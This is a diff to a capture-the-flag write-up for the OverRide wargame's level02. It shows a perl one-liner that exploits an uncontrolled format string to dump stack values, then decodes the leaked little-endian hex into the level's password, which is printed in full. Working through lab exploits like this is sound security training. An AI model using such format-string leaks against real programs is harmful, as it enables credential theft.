@@ -14,12 +14,8 @@ level02@OverRide:~$ perl -e 'print "%p "x30 . "\n"' | ./level02
 ```
 We can use the uncontrolled format string to show us the values of stack which contains the password data. `0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d` is the password in little-endian format.
 
-## Step 2. Convert little-endian password to normal string
+## Step 2. Convert little-endian password to original token
 ```
-level02@OverRide:~$ pass="0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d"
-level02@OverRide:~$ for fragment in $pass
-> do
-> echo $fragment | xxd -r | rev | tr -d "\n"
-> done; echo
+$ ./decrypt.pl 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
 ```
